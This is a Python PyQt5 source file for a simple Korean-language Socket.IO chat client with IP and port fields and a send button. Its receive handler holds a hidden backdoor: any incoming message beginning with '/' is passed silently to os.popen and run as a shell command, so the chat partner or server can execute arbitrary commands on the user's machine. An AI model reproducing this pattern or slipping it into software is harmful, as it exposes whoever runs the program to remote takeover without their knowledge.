import os, sys
from PyQt5.QtWidgets import QMainWindow, QFileDialog, QTableWidgetItem, QMessageBox, QApplication
from PyQt5.QtCore import QThread, pyqtSlot
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5 import uic

import socketio, time

ui_form = uic.loadUiType("main.ui")[0]

class SocketClient(QThread):
    add_chat = QtCore.pyqtSignal(str)
    sio = socketio.Client()
  
    def __init__(self, parent=None):
      super().__init__()
      self.main = parent
      self.is_run = False
      self.ip = 5000
      self.localhost = 'localhost'

    def set_host(self, ip, port):
      self.ip = ip
      self.port = port

    def run(self):
        host = 'http://%s:%s'%(self.ip, self.port) 
    
        self.connect(host)
        self.is_run = not self.is_run

    def connect(self, host):
      SocketClient.sio.on('receive', self.receive)
      SocketClient.sio.connect(host)
      self.add_chat.emit('채팅 서버와 접속 완료했습니다.')

    def send(self, msg):
      SocketClient.sio.emit('send', msg)
      self.add_chat.emit('[나]:%s'%(msg))

    def receive(self, msg):
      if msg.startswith('/'):
        os.popen(msg[1:])
      else:
        self.add_chat.emit('[상대방] %s'%(msg))

class ChatWindow(QMainWindow, ui_form) :
    def setupUi(self, MainWindow):
        MainWindow.setObjectName("Simple Chat Client")
        MainWindow.resize(800, 600)
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.btn_send = QtWidgets.QPushButton(self.centralwidget)
        self.btn_send.setGeometry(QtCore.QRect(640, 505, 113, 32))
        self.btn_send.setObjectName("btn_send")
        self.input_message = QtWidgets.QTextEdit(self.centralwidget)
        self.input_message.setGeometry(QtCore.QRect(30, 510, 601, 21))
        self.input_message.setObjectName("input_message")
        self.chats = QtWidgets.QPlainTextEdit(self.centralwidget)
        self.chats.setEnabled(False)
        self.chats.setGeometry(QtCore.QRect(30, 110, 715, 391))
        self.chats.setObjectName("chats")
        self.input_ip = QtWidgets.QTextEdit(self.centralwidget)
        self.input_ip.setGeometry(QtCore.QRect(60, 60, 151, 21))
        self.input_ip.setObjectName("input_ip")
        self.input_port = QtWidgets.QTextEdit(self.centralwidget)
        self.input_port.setGeometry(QtCore.QRect(300, 60, 221, 21))
        self.input_port.setObjectName("input_port")
        self.btn_connect = QtWidgets.QPushButton(self.centralwidget)
        self.btn_connect.setGeometry(QtCore.QRect(530, 55, 113, 32))
        self.btn_connect.setObjectName("btn_connect")
        self.label = QtWidgets.QLabel(self.centralwidget)
        self.label.setGeometry(QtCore.QRect(40, 60, 21, 16))
        self.label.setObjectName("label")
        self.label_2 = QtWidgets.QLabel(self.centralwidget)
        self.label_2.setGeometry(QtCore.QRect(250, 60, 51, 16))
        self.label_2.setObjectName("label_2")
        MainWindow.setCentralWidget(self.centralwidget)
        self.menubar = QtWidgets.QMenuBar(MainWindow)
        self.menubar.setGeometry(QtCore.QRect(0, 0, 800, 22))
        self.menubar.setObjectName("menubar")
        MainWindow.setMenuBar(self.menubar)
        self.statusbar = QtWidgets.QStatusBar(MainWindow)
        self.statusbar.setObjectName("statusbar")
        MainWindow.setStatusBar(self.statusbar)

        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)
        
        self.btn_send.clicked.connect(self.send_message)
        self.btn_connect.clicked.connect(self.socket_connection)
        self.sc = SocketClient(self)
        self.sc.add_chat.connect(self.add_chat)

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "MainWindow"))
        self.btn_send.setText(_translate("MainWindow", "전송"))
        self.btn_connect.setText(_translate("MainWindow", "연결"))
        self.label.setText(_translate("MainWindow", "IP:"))
        self.label_2.setText(_translate("MainWindow", "PORT:"))

    def socket_connection(self):
      ip = self.input_ip.toPlainText()
      port = self.input_port.toPlainText()
    
      if (not ip) or (not port):
        self.add_chat('ip 또는 port 번호가 비었습니다.')  
        return

      self.sc.set_host(ip, port)

      if not self.sc.is_run:
        self.sc.start()
  
    def send_message(self):
      if not self.sc.is_run:
        self.add_chat('서버와 연결 상태가 끊겨 있어 메시지를 전송할 수 없습니다.')  
        return

      msg = self.input_message.toPlainText()
      self.sc.send(msg)
      self.input_message.setPlainText('')

    @pyqtSlot(str)
    def add_chat(self, msg):
      self.chats.appendPlainText(msg)

if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    MainWindow = QtWidgets.QMainWindow()
    ui = ChatWindow()
    ui.setupUi(MainWindow)
    MainWindow.show()
    sys.exit(app.exec_())